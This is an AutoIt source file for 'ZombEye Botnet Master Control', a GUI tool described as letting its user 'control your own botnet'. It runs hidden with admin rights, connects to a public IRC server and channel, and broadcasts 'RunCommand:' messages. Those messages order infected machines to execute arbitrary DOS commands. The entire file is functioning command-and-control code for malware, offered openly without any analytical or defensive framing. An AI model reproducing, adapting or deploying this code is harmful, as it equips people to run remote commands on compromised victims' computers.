#NoTrayIcon
#RequireAdmin
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Icon=ZombEye_Icon.ico
#AutoIt3Wrapper_Res_Description=Control your own botnet.
#AutoIt3Wrapper_Res_Fileversion=0.1
#AutoIt3Wrapper_Res_LegalCopyright=Copyme 2014 zelles
#AutoIt3Wrapper_Res_Language=1033
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
#include <Misc.au3>
#include <ButtonConstants.au3>
#include <EditConstants.au3>
#include <GUIConstantsEx.au3>
#include <GuiEdit.au3>
#include <StaticConstants.au3>
#include <WindowsConstants.au3>

_Singleton("zombeyecontrol")

OnAutoItExitRegister("botnet_close")

Opt("GUIOnEventMode", 1)
Opt("TrayMenuMode", 3)
Opt("TCPTimeout", 0)

Global $botnet_server = IniRead("C:\bconfig.ini", "config", "server", "irc.freenode.net")
Global $botnet_port = IniRead("C:\bconfig.ini", "config", "port", "6667")
Global $botnet_chan = IniRead("C:\bconfig.ini", "config", "channel", "#globalzombiechan")
Global $botnet_name = IniRead("C:\bconfig.ini", "config", "master", "BotnetKing666")

Global $botnet_gui = GUICreate("ZombEye Botnet Master Control", 611, 301, 192, 124)
Global $botnet_status = GUICtrlCreateEdit("", 0, 0, 609, 129, BitOR($ES_AUTOVSCROLL,$ES_READONLY,$ES_WANTRETURN,$WS_VSCROLL))
Global $botnet_received = GUICtrlCreateEdit("", 0, 128, 609, 137, BitOR($ES_AUTOVSCROLL,$ES_READONLY,$ES_WANTRETURN,$WS_VSCROLL))
Global $botnet_label = GUICtrlCreateLabel("Run DOS Command:", 8, 275, 103, 17)
Global $botnet_input = GUICtrlCreateInput("ping google.com", 112, 272, 417, 21)
Global $botnet_button = GUICtrlCreateButton("SEND", 532, 272, 75, 21)
GUICtrlSetOnEvent($botnet_button, "botnet_send")
GUISetOnEvent($GUI_EVENT_CLOSE, "botnet_close", $botnet_gui)
GUISetState(@SW_SHOW, $botnet_gui)
_GUICtrlEdit_AppendText($botnet_status, @CRLF & "Welcome to botnet master control!")

botnet_up()
While 1
	If $botnet_conn = -1 Then botnet_down()
	botnet_recv()
WEnd

Func botnet_recv()
	Local $botnet_recv = TCPRecv($botnet_conn, 8192)
	If $botnet_recv <> "" Then _GUICtrlEdit_AppendText($botnet_received, @CRLF & $botnet_recv)
	Local $botnet_split = StringSplit($botnet_recv, @CRLF)
	For $botnet_count = 1 To $botnet_split[0] Step 1
		Local $botnet_splitmsg = StringSplit($botnet_split[$botnet_count], " ")
		If $botnet_splitmsg[1] = "" Then ContinueLoop
		If $botnet_splitmsg[1] = "PING" Then
			TCPSend($botnet_conn, "PONG " & $botnet_splitmsg[2] & @CRLF)
		EndIf
		If $botnet_splitmsg[0] <= 2 Then ContinueLoop
		Switch $botnet_splitmsg[2]
			Case "266"
				_GUICtrlEdit_AppendText($botnet_status, @CRLF & "Connected to IRC!")
		EndSwitch
	Next
EndFunc

Func botnet_send()
	_GUICtrlEdit_AppendText($botnet_status, @CRLF & "Sending DOS command...")
	Local $botnet_command = GUICtrlRead($botnet_input)
	GUICtrlSetData($botnet_input, "")
	TCPSend($botnet_conn, "PRIVMSG " & $botnet_chan & " :RunCommand:" & $botnet_command & @CRLF)
EndFunc

Func botnet_up()
	TCPStartup()
	_GUICtrlEdit_AppendText($botnet_status, @CRLF & "Connecting to IRC...")
	Global $botnet_conn = TCPConnect(TCPNameToIP($botnet_server), $botnet_port)
	If $botnet_conn = -1 Then botnet_down()
	TCPSend($botnet_conn, "NICK " & $botnet_name & @CRLF)
	TCPSend($botnet_conn, "USER " & $botnet_name & " 0 0 " & $botnet_name & @CRLF)
	TCPSend($botnet_conn, "JOIN " & $botnet_chan & @CRLF)
EndFunc

Func botnet_down()
	TCPCloseSocket($botnet_conn)
	TCPShutdown()
	_GUICtrlEdit_AppendText($botnet_status, @CRLF & "Disconnected from IRC...")
	Sleep(5000)
	botnet_up()
EndFunc

Func botnet_close()
	TCPCloseSocket($botnet_conn)
	TCPShutdown()
	Exit
EndFunc